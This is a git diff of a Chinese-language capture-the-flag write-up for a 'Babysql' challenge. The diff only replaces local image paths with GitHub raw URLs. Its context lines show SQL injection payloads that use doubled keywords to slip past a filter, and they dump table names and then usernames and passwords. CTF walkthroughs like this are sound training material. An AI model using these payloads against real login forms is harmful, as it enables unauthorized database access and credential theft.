@@ -5,7 +5,7 @@
 
 ## 首先fuzz一下，看看过滤了什么：
 
-![image](images/64BD0B3B46E64513830BE3100392E912Babysql1.png)
+![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/64BD0B3B46E64513830BE3100392E912Babysql1.png)
 
 发现输入的select...提示input your username and password,猜测被替换为空
 
@@ -22,7 +22,7 @@ payload:
 
 `?username=admin&password='ununionion%20selselectect%20null,database(),user()--+`
 
-![image](images/2488B416C8CB4B3BBBB9982872DC094EBabysql2.png)
+![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/2488B416C8CB4B3BBBB9982872DC094EBabysql2.png)
 
 ### 确定注入点以及回显点
 
@@ -30,7 +30,7 @@ payload:
 
 `?username=admin&password='ununionion%20selselectect%20null,version(),group_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema='geek'--`
 
-![image](images/CCF4AE5CEC2240C9A43DFA2793614D6EBabysql3.png)
+![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/CCF4AE5CEC2240C9A43DFA2793614D6EBabysql3.png)
 
 此处注意重写where和or
 
@@ -38,5 +38,5 @@ payload:
 
 `?username=admin&password='ununionion%20selselectect%20null,version(),group_concat(username,passwoorrd)%20frfromom%20b4bsql--+`
 
-![image](images/A9EF797965F04F3DB041AB7B5712D66FBabysql4.png)
+![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/A9EF797965F04F3DB041AB7B5712D66FBabysql4.png)
 
